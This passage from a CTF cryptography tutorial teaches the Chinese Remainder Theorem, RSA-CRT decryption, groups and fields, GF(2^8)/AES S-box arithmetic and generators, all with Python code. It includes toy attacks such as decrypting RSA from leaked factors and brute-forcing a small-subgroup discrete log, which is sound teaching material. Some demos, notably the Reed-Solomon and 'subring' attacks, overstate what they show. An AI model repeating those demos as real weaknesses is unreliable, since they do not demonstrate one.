- **[Inference]** Extended GCD is the most efficient method for computing modular inverses when the modulus is composite
- **Python 3.8+** provides `pow(a, -1, n)` which uses Extended GCD internally
- **Bézout's identity** guarantees that gcd(a,b) can be expressed as ax + by for integers x, y

---

### Chinese Remainder Theorem

The Chinese Remainder Theorem (CRT) provides a method to solve systems of simultaneous congruences with pairwise coprime moduli. This is fundamental to RSA optimization and various cryptographic protocols.

**Basic CRT Implementation**

```python
#!/usr/bin/env python3

def chinese_remainder_theorem(remainders, moduli):
    """
    Solve system of congruences:
        x ≡ a1 (mod n1)
        x ≡ a2 (mod n2)
        ...
        x ≡ ak (mod nk)
    
    Where n1, n2, ..., nk are pairwise coprime
    
    Returns: x (unique solution modulo N = n1 × n2 × ... × nk)
    """
    # Verify pairwise coprimality
    for i in range(len(moduli)):
        for j in range(i + 1, len(moduli)):
            if gcd_euclidean(moduli[i], moduli[j], False) != 1:
                raise ValueError(f"Moduli {moduli[i]} and {moduli[j]} are not coprime")
    
    # Compute product of all moduli
    N = 1
    for n in moduli:
        N *= n
    
    # Apply CRT formula
    x = 0
    for ai, ni in zip(remainders, moduli):
        Ni = N // ni  # Product of all moduli except ni
        Mi = pow(Ni, -1, ni)  # Modular inverse of Ni mod ni
        x += ai * Ni * Mi
    
    return x % N

# Example
print("Chinese Remainder Theorem:\n")

remainders = [2, 3, 2]
moduli = [3, 5, 7]

print("System of congruences:")
for a, n in zip(remainders, moduli):
    print(f"  x ≡ {a} (mod {n})")

x = chinese_remainder_theorem(remainders, moduli)
N = 1
for n in moduli:
    N *= n

print(f"\nSolution: x ≡ {x} (mod {N})")

# Verify
print("\nVerification:")
for a, n in zip(remainders, moduli):
    print(f"  {x} ≡ {x % n} (mod {n}) [expected {a}] {'✓' if x % n == a else '✗'}")
```

**CRT with Detailed Steps**

```python
#!/usr/bin/env python3

def crt_verbose(remainders, moduli):
    """
    Chinese Remainder Theorem with detailed explanation
    """
    print("Solving using Chinese Remainder Theorem:")
    print("="*60)
    
    # Check coprimality
    print("\n1. Verify pairwise coprimality:")
    for i in range(len(moduli)):
        for j in range(i + 1, len(moduli)):
            g = gcd_euclidean(moduli[i], moduli[j], False)
            print(f"   gcd({moduli[i]}, {moduli[j]}) = {g} {'✓' if g == 1 else '✗'}")
    
    # Compute N
    N = 1
    for n in moduli:
        N *= n
    print(f"\n2. Compute N = {' × '.join(map(str, moduli))} = {N}")
    
    # Compute Ni values
    print(f"\n3. Compute Ni = N / ni:")
    Ni_values = []
    for i, ni in enumerate(moduli):
        Ni = N // ni
        Ni_values.append(Ni)
        print(f"   N{i+1} = {N} / {ni} = {Ni}")
    
    # Compute Mi values (modular inverses)
    print(f"\n4. Compute Mi ≡ Ni^(-1) (mod ni):")
    Mi_values = []
    for i, (Ni, ni) in enumerate(zip(Ni_values, moduli)):
        Mi = pow(Ni, -1, ni)
        Mi_values.append(Mi)
        print(f"   M{i+1}: {Ni} × M{i+1} ≡ 1 (mod {ni})")
        print(f"       M{i+1} = {Mi}")
        print(f"       Check: {Ni} × {Mi} ≡ {(Ni * Mi) % ni} (mod {ni}) ✓")
    
    # Compute solution
    print(f"\n5. Compute x = Σ(ai × Ni × Mi) mod N:")
    x = 0
    terms = []
    for i, (ai, Ni, Mi) in enumerate(zip(remainders, Ni_values, Mi_values)):
        term = ai * Ni * Mi
        terms.append(term)
        print(f"   Term {i+1}: {ai} × {Ni} × {Mi} = {term}")
        x += term
    
    print(f"   Sum: {' + '.join(map(str, terms))} = {x}")
    x = x % N
    print(f"   x ≡ {x} (mod {N})")
    
    return x

# Example
remainders = [2, 3, 1]
moduli = [5, 7, 3]

print("System:")
for a, n in zip(remainders, moduli):
    print(f"  x ≡ {a} (mod {n})")
print()

x = crt_verbose(remainders, moduli)
```

**CRT for RSA Speedup**

```python
#!/usr/bin/env python3

def rsa_decrypt_crt(ciphertext, d, p, q, n):
    """
    RSA decryption using CRT (significantly faster)
    
    Instead of computing m = c^d mod n directly,
    compute:
        mp = c^d mod p
        mq = c^d mod q
    Then use CRT to combine them
    
    [Inference] Approximately 4x faster than standard RSA decryption
    """
    # Precompute values (done once during key generation)
    dp = d % (p - 1)  # d mod φ(p)
    dq = d % (q - 1)  # d mod φ(q)
    qinv = pow(q, -1, p)  # q^(-1) mod p
    
    # Compute mp and mq
    mp = pow(ciphertext, dp, p)
    mq = pow(ciphertext, dq, q)
    
    # Apply CRT (Garner's algorithm)
    h = (qinv * (mp - mq)) % p
    m = mq + h * q
    
    return m

# Demonstrate RSA-CRT
print("RSA Decryption with CRT Optimization:\n")

# Generate small RSA parameters
p = 1009
q = 1013
n = p * q
phi_n = (p - 1) * (q - 1)
e = 65537
d = pow(e, -1, phi_n)

# Encrypt message
m_original = 12345
c = pow(m_original, e, n)

print(f"RSA Parameters:")
print(f"  p = {p}, q = {q}")
print(f"  n = {n}")
print(f"  e = {e}, d = {d}")
print(f"  Message: {m_original}")
print(f"  Ciphertext: {c}\n")

# Standard decryption
import time

start = time.time()
m_standard = pow(c, d, n)
time_standard = time.time() - start

# CRT decryption
start = time.time()
m_crt = rsa_decrypt_crt(c, d, p, q, n)
time_crt = time.time() - start

print(f"Standard decryption: {m_standard} (time: {time_standard:.6f}s)")
print(f"CRT decryption: {m_crt} (time: {time_crt:.6f}s)")
print(f"Speedup: {time_standard/time_crt:.2f}x")
print(f"Results match: {m_standard == m_crt == m_original}")
```

**Solving Non-Coprime Systems (Generalized CRT)**

```python
#!/usr/bin/env python3

def generalized_crt(remainders, moduli):
    """
    Solve CRT for non-coprime moduli
    Uses successive reduction approach
    """
    if len(remainders) == 0:
        return 0, 1
    
    # Start with first congruence
    a1, n1 = remainders[0], moduli[0]
    
    for a2, n2 in zip(remainders[1:], moduli[1:]):
        # Solve: x ≡ a1 (mod n1) and x ≡ a2 (mod n2)
        g, p, q = extended_gcd(n1, n2)
        
        if (a2 - a1) % g != 0:
            return None, None  # No solution
        
        # Combine congruences
        lcm = (n1 * n2) // g
        a1 = (a1 + n1 * p * ((a2 - a1) // g)) % lcm
        n1 = lcm
    
    return a1, n1

# Example with non-coprime moduli
print("Generalized CRT (non-coprime moduli):\n")

# System with compatible non-coprime moduli
remainders = [2, 4, 3]
moduli = [6, 10, 15]  # gcd(6,10)=2, gcd(6,15)=3, gcd(10,15)=5

print("System:")
for a, n in zip(remainders, moduli):
    print(f"  x ≡ {a} (mod {n})")

x, N = generalized_crt(remainders, moduli)

if x is not None:
    print(f"\nSolution: x ≡ {x} (mod {N})")
    print("\nVerification:")
    for a, n in zip(remainders, moduli):
        print(f"  {x} ≡ {x % n} (mod {n}) [expected {a}] {'✓' if x % n == a else '✗'}")
else:
    print("\nNo solution exists (incompatible remainders)")

# Example with incompatible remainders
print("\n" + "="*60)
print("Incompatible system:\n")

remainders = [1, 2]
moduli = [4, 6]  # gcd(4,6) = 2, but 1 ≢ 2 (mod 2)

print("System:")
for a, n in zip(remainders, moduli):
    print(f"  x ≡ {a} (mod {n})")

x, N = generalized_crt(remainders, moduli)

if x is None:
    print("\nNo solution (remainders are incompatible modulo gcd)")
```

**CTF Application: Breaking Multi-Prime RSA**

```python
#!/usr/bin/env python3

def break_multiprime_rsa(n_factors, e, c):
    """
    Break RSA when n has more than 2 prime factors
    Using CRT to decrypt efficiently
    
    n = p1 × p2 × ... × pk
    """
    n = 1
    for p in n_factors:
        n *= p
    
    print(f"Multi-prime RSA with {len(n_factors)} factors")
    print(f"n = {' × '.join(map(str, n_factors))} = {n}\n")
    
    # Compute φ(n) = (p1-1)(p2-1)...(pk-1)
    phi_n = 1
    for p in n_factors:
        phi_n *= (p - 1)
    
    # Compute private exponent
    d = pow(e, -1, phi_n)
    print(f"φ(n) = {phi_n}")
    print(f"d = {d}\n")
    
    # Decrypt using CRT
    remainders = []
    for p in n_factors:
        dp = d % (p - 1)
        mp = pow(c, dp, p)
        remainders.append(mp)
        print(f"m mod {p} = {mp}")
    
    # Apply CRT
    m = chinese_remainder_theorem(remainders, n_factors)
    
    print(f"\nUsing CRT to combine:")
    print(f"m = {m}")
    
    return m

# CTF Scenario
print("CTF Challenge: Multi-Prime RSA\n")
print("="*60)

# Small multi-prime RSA example
primes = [17, 19, 23]
n = 17 * 19 * 23  # = 7429
e = 5
m_original = 1234

c = pow(m_original, e, n)

print(f"Given:")
print(f"  Ciphertext: c = {c}")
print(f"  Public exponent: e = {e}")
print(f"  Prime factors: {primes} (leaked!)\n")

m_recovered = break_multiprime_rsa(primes, e, c)

print(f"\nOriginal message: {m_original}")
print(f"Recovered message: {m_recovered}")
print(f"Success: {m_original == m_recovered}")
```

**Constructing Numbers with Specific Remainders**

```python
#!/usr/bin/env python3

def construct_with_crt(target_remainders, moduli):
    """
    Construct a number with specific remainders modulo given primes
    Useful for creating specific RSA moduli or padding oracle attacks
    """
    x = chinese_remainder_theorem(target_remainders, moduli)
    N = 1
    for n in moduli:
        N *= n
    
    print(f"Constructed number: {x}")
    print(f"Range: 0 ≤ x < {N}\n")
    print("Properties:")
    for a, n in zip(target_remainders, moduli):
        actual = x % n
        print(f"  {x} ≡ {actual} (mod {n}) [target: {a}] {'✓' if actual == a else '✗'}")
    
    return x

# Example: Create number divisible by some primes but not others
print("Construct number with specific divisibility properties:\n")

# Want: n ≡ 0 (mod 7), n ≡ 1 (mod 11), n ≡ 2 (mod 13)
remainders = [0, 1, 2]
moduli = [7, 11, 13]

n = construct_with_crt(remainders, moduli)

print(f"\nDivisibility check:")
print(f"  Divisible by 7: {n % 7 == 0}")
print(f"  Divisible by 11: {n % 11 == 0}")
print(f"  Divisible by 13: {n % 13 == 0}")
```

**Important Notes**

- **[Inference]** RSA-CRT provides ~4x speedup for decryption but requires storing p and q
- **Garner's algorithm** is the most efficient method for combining CRT results in practice
- **Fault attacks** on RSA-CRT can reveal secret primes if computation errors occur
- **[Unverified]** Some implementations use CRT for both encryption and decryption when both public and private keys have multiple prime factors

This completes the comprehensive coverage of Number Theory Basics for CTF cryptography challenges.

---

## Group Theory & Finite Fields

### Groups, Rings, Fields

Understanding algebraic structures is fundamental to cryptographic analysis in CTFs. These structures define the mathematical foundations of most modern cryptosystems.

**Group Definition:**

A group `(G, ·)` consists of a set `G` with a binary operation `·` satisfying:

1. **Closure**: For all `a, b ∈ G`, `a · b ∈ G`
2. **Associativity**: For all `a, b, c ∈ G`, `(a · b) · c = a · (b · c)`
3. **Identity**: Exists `e ∈ G` such that `a · e = e · a = a` for all `a ∈ G`
4. **Inverse**: For each `a ∈ G`, exists `a⁻¹ ∈ G` such that `a · a⁻¹ = a⁻¹ · a = e`

If additionally `a · b = b · a` for all elements, the group is **abelian** (commutative).

---

**Common cryptographic groups:**

**1. Integers modulo n under addition: (ℤ/nℤ, +)**

```python
class IntegerModuloAddition:
    """Group of integers modulo n under addition"""
    
    def __init__(self, n):
        self.n = n
        self.identity = 0
    
    def add(self, a, b):
        """Group operation: addition mod n"""
        return (a + b) % self.n
    
    def inverse(self, a):
        """Inverse element: -a mod n"""
        return (-a) % self.n
    
    def verify_group(self):
        """Verify group axioms"""
        n = self.n
        
        # Check closure (always true for modular arithmetic)
        print(f"Closure: ✓ (by definition)")
        
        # Check associativity
        test_assoc = (self.add(self.add(2, 3), 5) == 
                     self.add(2, self.add(3, 5)))
        print(f"Associativity: {'✓' if test_assoc else '✗'}")
        
        # Check identity
        test_identity = all(self.add(a, self.identity) == a 
                          for a in range(n))
        print(f"Identity (0): {'✓' if test_identity else '✗'}")
        
        # Check inverse
        test_inverse = all(self.add(a, self.inverse(a)) == self.identity 
                         for a in range(n))
        print(f"Inverse: {'✓' if test_inverse else '✗'}")

# Example usage
G = IntegerModuloAddition(7)
G.verify_group()
print(f"3 + 5 mod 7 = {G.add(3, 5)}")  # 1
print(f"Inverse of 3 mod 7 = {G.inverse(3)}")  # 4
```

**2. Multiplicative group modulo n: (ℤ/nℤ)***

Only elements coprime to n form a group under multiplication.

```python
from math import gcd

class MultiplicativeGroup:
    """Multiplicative group (Z/nZ)*"""
    
    def __init__(self, n):
        self.n = n
        self.identity = 1
        # Elements: all integers coprime to n
        self.elements = [a for a in range(1, n) if gcd(a, n) == 1]
        self.order = len(self.elements)  # Euler's totient φ(n)
    
    def multiply(self, a, b):
        """Group operation: multiplication mod n"""
        return (a * b) % self.n
    
    def inverse(self, a):
        """Modular multiplicative inverse"""
        return pow(a, -1, self.n)
    
    def power(self, a, k):
        """Exponentiation: a^k in group"""
        return pow(a, k, self.n)
    
    def euler_totient(self):
        """φ(n): order of multiplicative group"""
        return self.order

# Example: (Z/7Z)* = {1, 2, 3, 4, 5, 6}
G = MultiplicativeGroup(7)
print(f"Group elements: {G.elements}")
print(f"Order φ(7) = {G.euler_totient()}")  # 6
print(f"3 * 5 mod 7 = {G.multiply(3, 5)}")  # 1
print(f"3^(-1) mod 7 = {G.inverse(3)}")  # 5
```

**Computing Euler's totient φ(n):**

```python
def euler_totient(n):
    """
    Compute φ(n): count of integers ≤ n coprime to n
    
    Formula: φ(n) = n * ∏(1 - 1/p) for all prime divisors p
    """
    from sympy import factorint
    
    # Factor n
    factors = factorint(n)
    
    # Apply formula
    result = n
    for prime in factors:
        result *= (1 - 1/prime)
    
    return int(result)

# Examples
print(f"φ(12) = {euler_totient(12)}")  # 4: {1,5,7,11}
print(f"φ(17) = {euler_totient(17)}")  # 16: prime → φ(p) = p-1
print(f"φ(100) = {euler_totient(100)}")  # 40

# For RSA: n = p*q where p,q prime
p, q = 61, 53
n = p * q
phi_n = (p - 1) * (q - 1)
print(f"φ({n}) = {phi_n}")  # 3120
```

---

**Ring Definition:**

A ring `(R, +, ·)` is a set with two operations satisfying:

1. `(R, +)` is an abelian group
2. Multiplication is associative
3. Distributive laws: `a·(b+c) = a·b + a·c` and `(a+b)·c = a·c + b·c`

**Example: ℤ/nℤ under addition and multiplication**

```python
class IntegerRing:
    """Ring of integers modulo n"""
    
    def __init__(self, n):
        self.n = n
        self.zero = 0  # Additive identity
        self.one = 1   # Multiplicative identity (if exists)
    
    def add(self, a, b):
        return (a + b) % self.n
    
    def multiply(self, a, b):
        return (a * b) % self.n
    
    def additive_inverse(self, a):
        return (-a) % self.n
    
    def is_unit(self, a):
        """Check if element has multiplicative inverse"""
        return gcd(a, self.n) == 1
    
    def units(self):
        """All elements with multiplicative inverse"""
        return [a for a in range(self.n) if self.is_unit(a)]

# Example: Z/6Z
R = IntegerRing(6)
print(f"Units in Z/6Z: {R.units()}")  # {1, 5}
print(f"2 * 3 mod 6 = {R.multiply(2, 3)}")  # 0 (zero divisor)
```

**Zero divisors (important for CTF attacks):**

Elements `a, b ≠ 0` where `a·b = 0` in a ring.

```python
def find_zero_divisors(n):
    """Find all zero divisors in Z/nZ"""
    divisors = []
    
    for a in range(1, n):
        for b in range(a, n):
            if (a * b) % n == 0:
                divisors.append((a, b))
    
    return divisors

print(f"Zero divisors in Z/6Z: {find_zero_divisors(6)}")
# [(2, 3), (3, 4)] - important for breaking weak crypto
```

---

**Field Definition:**

A field `(F, +, ·)` is a commutative ring where every non-zero element has a multiplicative inverse.

**Properties:**

1. `(F, +)` is an abelian group
2. `(F\{0}, ·)` is an abelian group
3. Distributive law holds

**Example: ℤ/pℤ for prime p**

```python
class FiniteField:
    """Finite field Z/pZ (p must be prime)"""
    
    def __init__(self, p):
        from sympy import isprime
        
        if not isprime(p):
            raise ValueError("p must be prime for field")
        
        self.p = p
        self.elements = list(range(p))
    
    def add(self, a, b):
        return (a + b) % self.p
    
    def multiply(self, a, b):
        return (a * b) % self.p
    
    def inverse(self, a):
        """Every non-zero element has multiplicative inverse"""
        if a == 0:
            raise ValueError("Zero has no inverse")
        return pow(a, -1, self.p)
    
    def divide(self, a, b):
        """Division: a/b = a * b^(-1)"""
        return self.multiply(a, self.inverse(b))
    
    def solve_linear(self, a, b):
        """Solve ax = b in field"""
        return self.multiply(b, self.inverse(a))

# Example: GF(7)
F = FiniteField(7)
print(f"3^(-1) mod 7 = {F.inverse(3)}")  # 5
print(f"4 / 2 mod 7 = {F.divide(4, 2)}")  # 2
print(f"Solve 3x = 4 mod 7: x = {F.solve_linear(3, 4)}")  # 6
```

---

**CTF Application: Breaking composite modulus**

When modulus n is composite (not prime), ℤ/nℤ is a ring but not a field.

```python
def exploit_composite_modulus(n, ciphertext, e):
    """
    If RSA modulus n is composite and factors are known,
    can decrypt without full private key
    """
    from sympy import factorint
    
    # Factor n (if small or weak)
    factors = factorint(n)
    
    if len(factors) == 1:
        # n is prime power: n = p^k
        p = list(factors.keys())[0]
        k = factors[p]
        print(f"n = {p}^{k}")
        
        # Use Hensel lifting or direct computation
        phi_n = (p ** (k-1)) * (p - 1)
        d = pow(e, -1, phi_n)
        plaintext = pow(ciphertext, d, n)
        
        return plaintext
    
    elif len(factors) == 2:
        # Standard RSA: n = p*q
        p, q = factors.keys()
        phi_n = (p - 1) * (q - 1)
        d = pow(e, -1, phi_n)
        plaintext = pow(ciphertext, d, n)
        
        return plaintext
    
    else:
        # Multiple prime factors (multiprime RSA)
        print(f"Multiprime RSA with {len(factors)} factors")
        # Use CRT for decryption
        return None

# Example: Weak RSA with small modulus
n = 143  # 11 * 13
e = 7
c = 42

plaintext = exploit_composite_modulus(n, c, e)
print(f"Decrypted: {plaintext}")
```

---

**Subring attack example:**

```python
def subring_attack():
    """
    If encryption uses subring instead of full field,
    can reduce search space
    """
    
    # Example: Encryption in even numbers only (subring of Z/nZ)
    n = 100
    
    # Subring: {0, 2, 4, 6, ..., 98}
    subring = [x for x in range(0, n, 2)]
    
    print(f"Full ring size: {n}")
    print(f"Subring size: {len(subring)}")
    
    # If key is known to be in subring, search space reduced by half
    
    # Detect subring structure
    def is_in_subring(value, n):
        return value % 2 == 0
    
    # Example: If all observed ciphertexts are even
    ciphertexts = [42, 68, 24, 56]
    
    if all(is_in_subring(c, n) for c in ciphertexts):
        print("VULNERABLE: Encryption operates in proper subring")
        print("Search space reduced")

subring_attack()
```

---

### Galois Fields (GF)

Galois Fields `GF(p^n)` are finite fields with `p^n` elements, where `p` is prime. They are crucial for AES, ECC, and error-correcting codes.

**Prime fields: GF(p) = ℤ/pℤ**

Already covered above. Operations are modular arithmetic.

**Extension fields: GF(p^n) for n > 1**

Represented as polynomials of degree < n with coefficients in GF(p).

**GF(2^8) - Used in AES:**

```python
class GF256:
    """
    Galois Field GF(2^8) - AES field
    Irreducible polynomial: x^8 + x^4 + x^3 + x + 1 (0x11B)
    """
    
    def __init__(self):
        self.irreducible = 0x11B  # x^8 + x^4 + x^3 + x + 1
    
    def add(self, a, b):
        """Addition in GF(2^8): XOR"""
        return a ^ b
    
    def multiply(self, a, b):
        """
        Multiplication in GF(2^8) with reduction
        Using Russian peasant multiplication
        """
        result = 0
        
        while b:
            if b & 1:
                result ^= a
            
            # Check if a will overflow (bit 8 set)
            carry = a & 0x80
            a <<= 1
            
            if carry:
                a ^= self.irreducible  # Reduce by irreducible polynomial
            
            b >>= 1
        
        return result & 0xFF
    
    def power(self, a, n):
        """Exponentiation in GF(2^8)"""
        if n == 0:
            return 1
        
        result = 1
        base = a
        
        while n:
            if n & 1:
                result = self.multiply(result, base)
            base = self.multiply(base, base)
            n >>= 1
        
        return result
    
    def inverse(self, a):
        """
        Multiplicative inverse in GF(2^8)
        Using Fermat's little theorem: a^(-1) = a^(254) in GF(2^8)
        Since |GF(2^8)*| = 255, a^255 = 1
        """
        if a == 0:
            raise ValueError("Zero has no inverse")
        
        return self.power(a, 254)  # a^(2^8 - 2)
    
    def divide(self, a, b):
        """Division: a/b = a * b^(-1)"""
        return self.multiply(a, self.inverse(b))

# Example usage
gf = GF256()

# AES operations
a, b = 0x53, 0xCA
print(f"0x{a:02x} + 0x{b:02x} = 0x{gf.add(a, b):02x}")  # XOR
print(f"0x{a:02x} * 0x{b:02x} = 0x{gf.multiply(a, b):02x}")
print(f"0x{a:02x}^(-1) = 0x{gf.inverse(a):02x}")

# Verify: a * a^(-1) = 1
inv_a = gf.inverse(a)
print(f"Verify: 0x{a:02x} * 0x{inv_a:02x} = 0x{gf.multiply(a, inv_a):02x}")
```

**Precomputed lookup tables (faster for AES):**

```python
class GF256Fast:
    """GF(2^8) with precomputed tables"""
    
    def __init__(self):
        self.exp_table = [0] * 512  # exp_table[i] = 3^i
        self.log_table = [0] * 256  # log_table[3^i] = i
        
        # Generate tables using generator 3
        self._generate_tables()
    
    def _generate_tables(self):
        """Precompute exp and log tables"""
        x = 1
        
        for i in range(255):
            self.exp_table[i] = x
            self.log_table[x] = i
            
            # Multiply by 3 (generator)
            x ^= (x << 1)
            if x & 0x100:
                x ^= 0x11B  # Reduce
        
        # Extend exp table for easier computation
        for i in range(255, 512):
            self.exp_table[i] = self.exp_table[i - 255]
    
    def multiply(self, a, b):
        """Fast multiplication using log/exp tables"""
        if a == 0 or b == 0:
            return 0
        
        log_a = self.log_table[a]
        log_b = self.log_table[b]
        
        return self.exp_table[log_a + log_b]
    
    def divide(self, a, b):
        """Fast division using log/exp tables"""
        if a == 0:
            return 0
        if b == 0:
            raise ValueError("Division by zero")
        
        log_a = self.log_table[a]
        log_b = self.log_table[b]
        
        return self.exp_table[log_a - log_b + 255]
    
    def inverse(self, a):
        """Fast inverse using log/exp tables"""
        if a == 0:
            raise ValueError("Zero has no inverse")
        
        return self.exp_table[255 - self.log_table[a]]

# Performance comparison
gf_fast = GF256Fast()
a, b = 0x53, 0xCA

print(f"Fast multiply: 0x{gf_fast.multiply(a, b):02x}")
print(f"Fast inverse: 0x{gf_fast.inverse(a):02x}")
```

---

**CTF Application: Breaking weak AES S-box**

The AES S-box is built using GF(2^8) operations. Understanding this helps in differential cryptanalysis.

```python
def aes_sbox_generate():
    """Generate AES S-box using GF(2^8) operations"""
    gf = GF256()
    sbox = [0] * 256
    
    for x in range(256):
        # Step 1: Multiplicative inverse in GF(2^8)
        if x == 0:
            inv = 0
        else:
            inv = gf.inverse(x)
        
        # Step 2: Affine transformation
        # y = Ax + b in GF(2)
        y = 0
        for i in range(8):
            bit = 0
            bit ^= (inv >> i) & 1
            bit ^= (inv >> ((i + 4) % 8)) & 1
            bit ^= (inv >> ((i + 5) % 8)) & 1
            bit ^= (inv >> ((i + 6) % 8)) & 1
            bit ^= (inv >> ((i + 7) % 8)) & 1
            bit ^= (0x63 >> i) & 1  # Add constant
            
            y |= bit << i
        
        sbox[x] = y
    
    return sbox

# Verify against known AES S-box
sbox = aes_sbox_generate()
print(f"S-box[0x53] = 0x{sbox[0x53]:02x}")  # Should be 0xed

# Check for weak S-box (CTF vulnerability detection)
def analyze_sbox_properties(sbox):
    """Analyze S-box for cryptographic properties"""
    
    # Check for fixed points: S(x) = x
    fixed_points = [x for x in range(256) if sbox[x] == x]
    print(f"Fixed points: {len(fixed_points)}")  # AES S-box has 1
    
    # Check for involution property: S(S(x)) = x
    involution_count = sum(1 for x in range(256) 
                          if sbox[sbox[x]] == x)
    print(f"Involution pairs: {involution_count}")
    
    # Differential uniformity (should be low)
    max_diff = 0
    for delta in range(1, 256):
        for dx in range(256):
            diff_count = sum(1 for x in range(256)
                           if sbox[x] ^ sbox[x ^ delta] == dx)
            max_diff = max(max_diff, diff_count)
    
    print(f"Max differential: {max_diff}")  # AES: 4 (good)

analyze_sbox_properties(sbox)
```

---

**GF(2^n) for different n:**

```python
class GF2n:
    """Generic GF(2^n) implementation"""
    
    def __init__(self, n, irreducible_poly):
        """
        n: field degree
        irreducible_poly: irreducible polynomial (integer representation)
        """
        self.n = n
        self.size = 2 ** n
        self.irreducible = irreducible_poly
        self.modulus = 1 << n  # 2^n
    
    def add(self, a, b):
        """Addition: XOR"""
        return a ^ b
    
    def multiply(self, a, b):
        """Multiplication with polynomial reduction"""
        result = 0
        
        while b:
            if b & 1:
                result ^= a
            
            b >>= 1
            a <<= 1
            
            if a & self.modulus:  # Overflow
                a ^= self.irreducible
        
        return result
    
    def power(self, a, exp):
        """Exponentiation"""
        result = 1
        base = a
        
        while exp:
            if exp & 1:
                result = self.multiply(result, base)
            base = self.multiply(base, base)
            exp >>= 1
        
        return result
    
    def inverse(self, a):
        """Inverse using extended Euclidean algorithm"""
        if a == 0:
            raise ValueError("Zero has no inverse")
        
        # Fermat's little theorem: a^(2^n - 2)
        return self.power(a, self.size - 2)

# GF(2^4) - used in some lightweight crypto
# Irreducible polynomial: x^4 + x + 1 (0b10011)
gf16 = GF2n(4, 0b10011)

a, b = 0b1010, 0b0111  # x^3 + x and x^2 + x + 1
print(f"GF(2^4): {bin(a)} * {bin(b)} = {bin(gf16.multiply(a, b))}")

# GF(2^128) - used in AES-GCM
# Irreducible: x^128 + x^7 + x^2 + x + 1
gf128_poly = (1 << 128) | (1 << 7) | (1 << 2) | (1 << 1) | 1
# Note: Actual implementation would need big integer support
```

---

**CTF Application: Reed-Solomon error correction attack**

Reed-Solomon codes use GF(2^8) operations. Understanding field arithmetic helps break them.

```python
def reed_solomon_vulnerability():
    """
    Demonstrate vulnerability in weak Reed-Solomon implementation
    """
    gf = GF256()
    
    # Simplified RS encoding: systematic code
    def rs_encode_simple(data, n_parity=4):
        """Encode data with n_parity symbols"""
        # Generator polynomial (simplified)
        message = list(data)
        
        # Add parity symbols
        for i in range(n_parity):
            parity = 0
            for j, byte in enumerate(message):
                parity = gf.add(parity, gf.multiply(byte, j + 1))
            message.append(parity)
        
        return message
    
    # If implementation uses weak generator or predictable structure
    data = [0x41, 0x42, 0x43, 0x44]  # "ABCD"
    encoded = rs_encode_simple(data)
    
    print(f"Original: {[hex(x) for x in data]}")
    print(f"Encoded: {[hex(x) for x in encoded]}")
    
    # Attack: If attacker knows generator structure
    # Can forge valid codewords
    forged_data = [0xFF, 0xFF, 0xFF, 0xFF]
    forged_encoded = rs_encode_simple(forged_data)
    
    print(f"Forged: {[hex(x) for x in forged_encoded]}")
    
    # [Inference] Proper RS uses primitive elements and systematic encoding
    # Weak implementations may use predictable generators

reed_solomon_vulnerability()
```

---

### Generator Elements

A generator (primitive element) of a multiplicative group generates all non-zero elements through repeated multiplication.

**Definition:**

Element `g` is a generator of group `G` if every element `a ∈ G` can be written as `g^k` for some integer `k`.

**Finding generators in (ℤ/pℤ)*:**

```python
def find_generators(p):
    """
    Find all generators of multiplicative group mod p
    Generator has order p-1 (generates all elements)
    """
    from sympy import isprime, factorint
    
    if not isprime(p):
        raise ValueError("p must be prime")
    
    generators = []
    order = p - 1
    
    # Factor p-1 to find orders
    factors = list(factorint(order).keys())
    
    for g in range(2, p):
        is_generator = True
        
        # Check if g^((p-1)/q) ≠ 1 for all prime divisors q of p-1
        for q in factors:
            if pow(g, order // q, p) == 1:
                is_generator = False
                break
        
        if is_generator:
            generators.append(g)
    
    return generators

# Example: Generators of (Z/7Z)*
p = 7
gens = find_generators(p)
print(f"Generators mod {p}: {gens}")  # [3, 5]

# Verify: Generate all elements using g=3
g = 3
elements = [pow(g, k, p) for k in range(p - 1)]
print(f"Powers of {g}: {elements}")  # [1, 3, 2, 6, 4, 5] - all non-zero mod 7
```

**Computing element order:**

```python
def element_order(g, p):
    """
    Compute order of element g in (Z/pZ)*
    Order is smallest k > 0 such that g^k ≡ 1 (mod p)
    """
    order = 1
    current = g % p
    
    while current != 1:
        current = (current * g) % p
        order += 1
        
        if order > p:  # Safety check
            return None
    
    return order

# Examples
p = 11
for g in range(2, p):
    order = element_order(g, p)
    print(f"ord_{p}({g}) = {order}")
```

**Efficient order computation using Lagrange's theorem:**

```python
def element_order_fast(g, p):
    """
    Efficient order computation
    Order divides p-1 (Lagrange's theorem)
    """
    from sympy import divisors
    
    order_group = p - 1
    
    # Check all divisors of p-1
    for d in sorted(divisors(order_group)):
        if pow(g, d, p) == 1:
            return d
    
    return None

# Verify with large prime
p = 1000000007
g = 5
order = element_order_fast(g, p)
print(f"ord_{p}({g}) = {order}")
```

---

**CTF Application: Discrete logarithm with non-generator**

```python
def dlog_non_generator_attack(g, h, p):
    """
    If g is not a generator, discrete log problem may be easier
    
    Given: h = g^x mod p, find x
    If ord(g) is small, can brute-force
    """
    order_g = element_order_fast(g, p)
    
    print(f"Order of generator: {order_g}")
    print(f"Group order: {p - 1}")
    
    if order_g < 10000:
        print("VULNERABLE: Small subgroup attack possible")
        
        # Brute-force in subgroup
        for x in range(order_g):
            if pow(g, x, p) == h:
                print(f"Found: x = {x}")
                return x
    
    else:
        print("Generator has large order, attack infeasible")
        return None

# Example: Weak Diffie-Hellman
p = 1019  # Prime
g = 4     # Check if generator
h = 42    # Public key

x = dlog_non_generator_attack(g, h, p)
if x:
    print(f"Private key recovered: {x}")
```

**Finding primitive roots (generators) efficiently:**

```python
def find_primitive_root(p):
    """
    Find smallest primitive root (generator) mod p
    Uses probabilistic test
    """
    from sympy import isprime, factorint
    import random
    
    if not isprime(p):
        return None
    
    phi = p - 1
    prime_factors = list(factorint(phi).keys())
    
    # Try random elements
    for attempt in range(100):
        g = random.randint(2, p - 1)
        
        is_primitive = True
        for q in prime_factors:
            if pow(g, phi // q, p) == 1:
                is_primitive = False
                break
        
        if is_primitive:
            return g
    
    return None

# Find generator for large prime
p = 1000000007
g = find_primitive_root(p)
print(f"Primitive root mod {p}: {g}")

# Verify
phi = p - 1
print(f"Verification: {g}^{phi} mod {p} = {pow(g, phi, p)}")  # Should be 1
```

**Generator in GF(2^n):**

For extension fields, generators are elements whose powers produce all non-zero field elements.

```python
def find_generator_gf2n(n, irreducible):
    """
    Find generator (primitive element) of GF(2^n)
    
    A generator g has order 2^n - 1
    """
    gf = GF2n(n, irreducible)
    field_order = (2 ** n) - 1  # Order of multiplicative group
    
    from sympy import factorint
    prime_factors = list(factorint(field_order).keys())
    
    for candidate in range(2, 2 ** n):
        is_generator = True
        
